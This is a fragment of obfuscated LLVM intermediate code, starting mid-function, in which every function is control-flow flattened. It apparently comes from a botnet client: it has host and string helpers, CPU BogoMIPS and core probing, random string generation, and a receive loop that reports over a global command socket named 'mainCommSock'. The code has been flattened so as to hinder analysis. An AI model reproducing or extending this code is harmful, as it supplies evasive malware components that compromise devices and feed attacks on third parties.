  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -791780315, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1669217320, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 1669217320, label %NodeBlock5
    i32 415647394, label %NodeBlock
    i32 -304953285, label %LeafBlock3
    i32 -2006326436, label %LeafBlock1
    i32 593535332, label %LeafBlock
    i32 -604125061, label %14
    i32 1831900663, label %18
    i32 1474353079, label %25
    i32 1386852560, label %31
    i32 -1795150490, label %38
    i32 1310054137, label %39
    i32 1208464479, label %42
    i32 864726255, label %48
    i32 1945295526, label %56
    i32 1745302197, label %NewDefault
    i32 1953684349, label %59
    i32 935327635, label %70
    i32 889458399, label %78
    i32 196995838, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 593535332, i32 415647394
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -2006326436, i32 -304953285
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 1208464479, i32 1745302197
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 1831900663, i32 1745302197
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -604125061, i32 1745302197
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 196995838, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 1474353079, i32 1310054137
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1386852560, i32 -1795150490
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -1795150490, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 1310054137, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 196995838, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 864726255, i32 1945295526
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 1945295526, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 196995838, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1953684349, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 935327635, i32 889458399
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 889458399, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 196995838, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1052061533, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1052061533, label %first
    i32 -1094553049, label %13
    i32 -555443247, label %14
    i32 -764689963, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -1094553049, i32 -555443247
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -764689963, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -764689963, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -62929816, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -62929816, label %3
    i32 1692549064, label %8
    i32 -1849730174, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 1692549064, i32 -1849730174
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -62929816, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -164705882, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -164705882, label %8
    i32 266571000, label %14
    i32 -1095715435, label %21
    i32 252308168, label %24
    i32 1155328364, label %30
    i32 -663270641, label %36
    i32 1872149267, label %41
    i32 -1285377013, label %43
    i32 8170664, label %46
    i32 -458894374, label %47
    i32 1942067625, label %57
    i32 -1844326479, label %66
    i32 -1303457295, label %68
    i32 1273723879, label %74
    i32 -86237463, label %79
    i32 1969367481, label %82
    i32 63695473, label %88
    i32 -1657647924, label %90
    i32 -608207923, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 266571000, i32 -1657647924
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 -1095715435, i32 63695473
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 252308168, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 1872149267, i32 1155328364
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 1872149267, i32 -663270641
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 1872149267, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 -1285377013, i32 8170664
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 252308168, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -458894374, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 -1844326479, i32 1942067625
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 -1844326479, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 -1303457295, i32 1273723879
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 -458894374, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 -86237463, i32 1969367481
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 1969367481, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #2
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 -608207923, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 -164705882, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 -608207923, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 132398743, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 132398743, label %5
    i32 -1772465468, label %11
    i32 -1743198069, label %18
    i32 -1705091472, label %21
    i32 769656405, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 -1772465468, i32 769656405
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 -1743198069, i32 -1705091472
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 -1705091472, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 132398743, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1709123542, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1709123542, label %6
    i32 1708127103, label %11
    i32 -1214030082, label %20
    i32 -971929052, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 1708127103, i32 -971929052
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1214030082, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1709123542, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -435980267, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -435980267, label %24
    i32 -1869263545, label %33
    i32 -456594692, label %50
    i32 2014565324, label %51
    i32 -804880445, label %55
    i32 -1450855323, label %60
    i32 1627637416, label %69
    i32 -546562804, label %86
    i32 386286263, label %89
    i32 -1427511436, label %90
    i32 488906380, label %91
    i32 -1344088570, label %93
    i32 2031979331, label %98
    i32 -815737764, label %103
    i32 -1554481409, label %105
    i32 -388091092, label %113
    i32 1280946076, label %114
    i32 -986413188, label %117
    i32 1119274024, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -1869263545, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -456594692, i32 488906380
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 2014565324, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -804880445, i32 -1427511436
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -1450855323, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 1627637416, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -546562804, i32 386286263
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 2014565324, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
